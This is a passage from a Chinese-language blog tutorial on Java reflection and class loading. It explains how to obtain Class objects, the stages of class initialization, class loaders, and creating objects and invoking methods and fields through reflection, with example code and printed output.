class="hljs-built_in">this</span>.name=<span class="hljs-string">&quot;学生&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">person</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">teacher</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=<span class="hljs-string">&quot;老师&quot;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191300323.png" alt="image-20220930193902067"> </p><h3 id="获取class的实例"><a href="#获取class的实例" class="headerlink" title="获取class的实例"></a>获取class的实例</h3><p>a）若已知具体的类，通过类的class属性获取，该方法最为安全可靠，程序性能最高。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class c1=Person.class<br></code></pre></td></tr></table></figure><p>b）已知某个类的实例，调用该实例的getClass()方法获取Class对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> person.getClass();<br></code></pre></td></tr></table></figure><p>c）已知一个类的全类名，且该类在类路径下，可通过Class类的静态方法forName()获取，可能抛出ClassNotFoundException</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;demo01.Student&quot;</span>);<br></code></pre></td></tr></table></figure><p>d）内置基本数据类型可以直接用类名.Type</p><p>e）还可以利用ClassLoader我们之后讲解</p><h3 id="那一些类型可以有Class对象"><a href="#那一些类型可以有Class对象" class="headerlink" title="那一些类型可以有Class对象"></a>那一些类型可以有Class对象</h3><ul><li>class：外部类，成员(成员内部类，静态内部类)，局部内部类，匿名内部类</li><li>interface：接口</li><li>[]：数组</li><li>enum：枚举</li><li>annotation：注解@interface</li><li>primitive type：基本数据类型</li><li>void</li></ul><p>有一个有趣的小实验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">reflect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-type">int</span>[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">100</span>];<br>        <span class="hljs-type">int</span>[] b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1000</span>];<br>        System.out.println(a.getClass().hashCode());<br>        System.out.println(b.getClass().hashCode());<br><br><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//输出结果为</span><br><span class="hljs-number">41903949</span><br><span class="hljs-number">41903949</span><br><br></code></pre></td></tr></table></figure><p>大小不同的数组，其实用的是同一个class</p><p>所以我们得出结论，只要元素维度一样，就是同一个class</p><h2 id="5、Java内存分析"><a href="#5、Java内存分析" class="headerlink" title="5、Java内存分析"></a>5、Java内存分析</h2><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301697.png" alt="image-20220930203511713"> </p><h3 id="类的加载过程"><a href="#类的加载过程" class="headerlink" title="类的加载过程"></a>类的加载过程</h3><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301786.png" alt="image-20220930203551658"> </p><h3 id="类的加载与ClassLoader的理解"><a href="#类的加载与ClassLoader的理解" class="headerlink" title="类的加载与ClassLoader的理解"></a>类的加载与ClassLoader的理解</h3><p>首先有三个区域</p><p>堆、栈、方法区（特殊的堆）</p><ul><li>加载：<ul><li>将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后生成一个代表这个类的java.lang.Class对象.</li></ul></li><li>链接：将Java类的二进制代码合并到JVM的运行状态之中的过程。<ul><li>验证：确保加载的类信息符合JVM规范，没有安全方面的问题</li><li>准备：正式为类变量（static）分配内存并设置类变量默认初始值的阶段，这些内存都将在方法区中进行分配。</li><li>解析：虚拟机常量池内的符号引用（常量名）替换为直接引用（地址）的过程。</li></ul></li><li>初始化<ul><li>执行类构造器<code>&lt;clinit&gt;()</code>方法的过程。类构造器()方法是由编译期自动收集类中所有类<strong>变量的赋值动作和静态代码块中的语句合并产生的</strong>。（类构造器是构造类信息的，不是构造该类对象的构造器）。</li><li>当初始化一个类的时候，如果发现其父类还没有进行初始化，则需要先触发其父类的初始化。</li><li>虚拟机会保证一个类的()方法在多线程环境中被正确加锁和同步。</li></ul></li></ul><p>下面来看一个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test05</span> &#123;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;a类代码初始化&quot;</span>);<br>        m=<span class="hljs-number">300</span>;<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> m=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">a</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;a的无参构造初始化&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在我们加载的时候把字节码加载到内存当中，就形成了这两个Java.lang.Class对象，在堆中这两个对象分别代表着方法区中的类</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301598.png" alt="image-20220930204410623"> </p><p>然后我们准备开始执行我们的main方法</p><p>正式为类变量（static）分配内存并设置类变量默认初始值的阶段，这些内存都将在方法区中进行分配。m的初始值为0，并且把符号替换为直接引用（由变量名）</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301292.png" alt="image-20220930204755428"> </p><p>然后我们new了一个对象a，这个对象a就代表Java.lang.Class里面的东西，从而指向a类的数据，也就拿到了a类的数据</p><p>之后执行<code>clinit()</code>方法，把所有静态代码块合并，于是得到</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">m</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">300</span><br><span class="hljs-attribute">m</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p><strong>总结步骤如下</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301603.png" alt="image-20220930205356851"> </p><h3 id="什么时候会发生类的初始化"><a href="#什么时候会发生类的初始化" class="headerlink" title="什么时候会发生类的初始化"></a>什么时候会发生类的初始化</h3><ul><li><h4 id="类的主动引用（一定会发生初始化）"><a href="#类的主动引用（一定会发生初始化）" class="headerlink" title="类的主动引用（一定会发生初始化）"></a>类的主动引用（一定会发生初始化）</h4><ul><li>当虚拟机启动，先初始化main方法所在的类</li><li>new一个类的对象</li><li>调用类的静态成员（除了fifinal常量）和静态方法</li><li>使用java.lang.reflflect包的方法对类进行反射调用</li><li>当初始化一个类，如果其父类没有被初始化，则先会初始化它的父类</li></ul></li></ul><p>示例如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.ServerError;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test05</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;main类被加载&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//主动引用</span><br>        Student s=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> b=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;父类被加载&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;子类被加载&quot;</span>);<br>        m=<span class="hljs-number">300</span>;<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> m=<span class="hljs-number">100</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>类被加载<br>父类被加载<br>子类被加载<br></code></pre></td></tr></table></figure><p>修改代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>       <span class="hljs-comment">//主动引用</span><br>       <span class="hljs-comment">//Student s=new Student();</span><br>       <span class="hljs-comment">//反射也会产生主动引用</span><br>       Class.forName(<span class="hljs-string">&quot;Student&quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><p>结果和上面一样</p><ul><li><h4 id="类的被动引用"><a href="#类的被动引用" class="headerlink" title="类的被动引用"></a>类的被动引用</h4><ul><li>当访问一个静态域时，只有真正声明这个域的类才会被初始化。如：当通过子类引用父类的静态变量，不会导致子类初始化</li><li>通过数组定义类引用，不会触发此类的初始化</li><li>引用常量不会触发此类的初始化（常量在链接阶段就存入调用类的常量池中了）</li></ul></li></ul><p>修改代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <span class="hljs-comment">//不会产生类的引用的方法</span><br>    System.out.println(Student.b);<br>&#125;<br></code></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>类被加载<br>父类被加载<br><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>发现没有被加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>       Student[] arra=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>[<span class="hljs-number">5</span>];<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>类被加载<br></code></pre></td></tr></table></figure><h3 id="类加载器作用"><a href="#类加载器作用" class="headerlink" title="类加载器作用"></a>类加载器作用</h3><ul><li>类加载的作用：将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后在堆中生成一个代表这个类的java.lang.Class对象，作为方法区中类数据的访问入口。</li><li>类缓存：标准的JavaSE类加载器可以按要求查找类，但一旦某个类被加载到类加载器中，它将维持加载（缓存）一段时间。不过JVM垃圾回收机制可以回收这些Class对象</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301533.png" alt="image-20220930220818123"> </p><ul><li>类加载器作用是用来把类(class)装载进内存的。JVM 规范定义了如下类型的类的加载器</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301668.png" alt="image-20220930220859920"> </p><p>下面这一些代码检测了类加载器是由哪一些成分加载的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br><br>        <span class="hljs-comment">//获取系统类的加载器</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">systemClassLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        System.out.println(systemClassLoader);<br>        <span class="hljs-comment">//获取系统加载器的父类加载器-&gt;拓展类加载器</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> systemClassLoader.getParent();<br>        System.out.println(parent);<br>        <span class="hljs-comment">//获取拓展类加载器的父类加载器-&gt;根加载器（c/c++）</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">parent1</span> <span class="hljs-operator">=</span> parent.getParent();<br>        System.out.println(parent1);<br>        <span class="hljs-comment">//测试当前类是哪一个类加载的</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;test&quot;</span>).getClassLoader();<br>        System.out.println(test);<br>        <span class="hljs-comment">//测试jdk内置的类是谁加载的</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getClassLoader();<br>        System.out.println(test1);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>一个快捷键ctrl+alt+v</p><p>输出结果</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.loader</span>.ClassLoaders<span class="hljs-variable">$AppClassLoader</span>@<span class="hljs-number">1</span>f89ab83<br>jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.loader</span>.ClassLoaders<span class="hljs-variable">$PlatformClassLoader</span>@<span class="hljs-number">27</span>f674d<br>null<br>jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.loader</span>.ClassLoaders<span class="hljs-variable">$AppClassLoader</span>@<span class="hljs-number">1</span>f89ab83<br>null<br></code></pre></td></tr></table></figure><h2 id="6、获取类运行时的完整结构"><a href="#6、获取类运行时的完整结构" class="headerlink" title="6、获取类运行时的完整结构"></a>6、获取类运行时的完整结构</h2><p>通过反射获取运行时类的完整结构</p><p>Field、Method、Constructor、Superclass、Interface、Annotation</p><p>作用如下</p><ul><li>实现全部的接口</li><li>找到所继承的父类</li><li>全部的构造器</li><li>全部的方法</li><li>全部的Field</li><li>注解</li></ul><p>示例代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test09</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-comment">//获取类的名字</span><br>        System.out.println(test.getName());<span class="hljs-comment">//获取包名+类名</span><br>        System.out.println(test.getSimpleName());<span class="hljs-comment">//获取类名</span><br><br>        <span class="hljs-comment">//在Java反射中Field用于获取某个类的属性或该属性的属性值</span><br>        Field[] fields = test.getFields();<span class="hljs-comment">//只能找到public属性</span><br>        Field[] declaredFields = test.getDeclaredFields();<span class="hljs-comment">//能够找到全部的属性</span><br>        <span class="hljs-keyword">for</span>(Field field:declaredFields)&#123;<br>            System.out.println(field);<br>        &#125;<br><br>        <span class="hljs-comment">//获取类的方法</span><br>        Method[] methods = test.getMethods();<span class="hljs-comment">//获取本类以及父类的所有方法</span><br>        <span class="hljs-keyword">for</span>(Method method:methods)&#123;<br>            System.out.println(<span class="hljs-string">&quot;正常的&quot;</span>+method);<br>        &#125;<br>        methods=test.getDeclaredMethods();<span class="hljs-comment">//获取本类的所有方法</span><br>        <span class="hljs-keyword">for</span>(Method method:methods)&#123;<br>            System.out.println(<span class="hljs-string">&quot;getdeclaredmethod&quot;</span>+method);<br>        &#125;<br><br>        <span class="hljs-comment">//获得指定方法</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> test.getMethod(<span class="hljs-string">&quot;method&quot;</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> test.getMethod(<span class="hljs-string">&quot;method2&quot;</span>, <span class="hljs-type">char</span>.class);<br><br>        <span class="hljs-comment">//获得指定的构造器</span><br>        Constructor[] constructors = test.getConstructors();<span class="hljs-comment">//只获得public方法</span><br>        Constructor[] declaredConstructors = test.getDeclaredConstructors();<span class="hljs-comment">//可以获得本类的所有方法</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> test.getConstructor(<span class="hljs-type">char</span>.class, String.class, <span class="hljs-type">int</span>.class);<span class="hljs-comment">//获得指定的构造器</span><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="7、有了Class对象，我们能做什么"><a href="#7、有了Class对象，我们能做什么" class="headerlink" title="7、有了Class对象，我们能做什么"></a>7、有了Class对象，我们能做什么</h2><ul><li><p>创建类的对象：调用Class对象的newInstance()方法</p><ul><li>类必须有一个无参数的构造器。</li><li>类的构造器的访问权限需要足够</li></ul></li><li><p>思考？难道没有无参的构造器就不能创建对象了吗？只要在操作的时候明确的调用类中的构造器，并将参数传递进去之后，才可以实例化操作</p></li><li><p>步骤如下</p><ul><li>通过Class类的getDeclaredConstructor(Class … parameterTypes)取得本类的指定形参类型的构造器</li><li>向构造器的形参中传递一个对象数组进去，里面包含了构造器中所需的各个参数。</li><li>通过Constructor实例化对象</li></ul></li></ul><p><strong>下面是一些示例：</strong></p><p>对于不带参数的public类型的Class，我们可以直接对其创建实例，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">String s = String.<span class="hljs-keyword">class</span>.<span class="hljs-title function_ invoke__">newInstance</span>();<br></code></pre></td></tr></table></figure><p>但对于带参数的Class，需要调用其带任意参数的构造方法，必须借助于Constructor对象</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp">Constructor cons1 = Child.<span class="hljs-keyword">class</span>.getConstructor(String.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">int</span>.<span class="hljs-keyword">class</span>);<br>Child kid = (Child) cons1.newInstance(<span class="hljs-string">&quot;testName&quot;</span>,<span class="hljs-number">60</span>);<br>System.<span class="hljs-keyword">out</span>.println(kid.name);<br></code></pre></td></tr></table></figure><ol><li>首先获取该对象的构造方法</li><li>对该构造方法调用newInstance并传入特定参数，创建实例成功</li><li>Constructor有getConstructor(Class)、getDeclaredConstructor(Class)、getConstructors()、getDeclaredConstructors()，使用方法类似，不再赘述</li></ol><p><strong>调用指定的方法</strong></p><ul><li><p>通过反射，调用类中的方法，通过Method类完成</p><ul><li>通过Class类的getMethod(String name,Class…parameterTypes)方法取得一个Method对象，并设置此方法操作时所需要的参数类型。</li><li>之后使用Object invoke(Object obj, Object[] args)进行调用，并向方法中传递要设置的obj对象的参数信息。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191301846.png" alt="image-20221002194905431"> </p><ul><li>Object 对应原方法的返回值，若原方法无返回值，此时返回null</li><li>若原方法若为静态方法，此时形参Object obj可为null</li><li>若原方法形参列表为空，则Object[] args为null</li><li>若原方法声明为private,则需要在调用此invoke()方法前，显式调用方法对象的setAccessible(true)方法，将可访问private的方法。</li></ul></li></ul><p>这是两段测试代码（不知道为什么直接打印一个类的时候会输出@什么东西）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test09</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException &#123;<br>        <span class="hljs-comment">//获取对象</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;test01&quot;</span>);<br><br>        <span class="hljs-comment">//构造对象</span><br>        <span class="hljs-comment">//newInstance方法讲解</span><br>        <span class="hljs-comment">//类类和构造函数类的 newInstance（） 方法用于创建该类的新实例。</span><br>        <span class="hljs-type">test01</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (test01) c1.newInstance();<span class="hljs-comment">//本质上是调用无参构造器</span><br>        System.out.println(o.name);<br><br>        <span class="hljs-comment">//通过构造器创建带参数的class对象对象</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">declaredConstructor</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(String.class);<br>        <span class="hljs-type">test01</span> <span class="hljs-variable">newperson</span> <span class="hljs-operator">=</span> (test01) declaredConstructor.newInstance(<span class="hljs-string">&quot;lyj&quot;</span>);<br>        System.out.println(newperson.name);<br><br>        <span class="hljs-comment">//调用普通方法，没有办法直接调用，得先获取</span><br>        <span class="hljs-type">test01</span> <span class="hljs-variable">o1</span> <span class="hljs-operator">=</span> (test01)c1.newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">setName</span> <span class="hljs-operator">=</span> c1.getDeclaredMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<span class="hljs-comment">//先获取这个方法</span><br>        setName.invoke(o1,<span class="hljs-string">&quot;fuck&quot;</span>);<span class="hljs-comment">//通过invoke方法激活并修改值（对象，”方法的值“）</span><br>        System.out.println(o1.getName());<br><br>        <span class="hljs-comment">//通过反射操作属性</span><br>        <span class="hljs-type">test01</span> <span class="hljs-variable">o2</span> <span class="hljs-operator">=</span> (test01)c1.newInstance();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        name1.set(o2,<span class="hljs-string">&quot;fuzz&quot;</span>);<br>        System.out.println(o2.getName());<br><br>    &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">test01</span>&#123;<br>    String name=<span class="hljs-string">&quot;ace&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">test01</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">test01</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    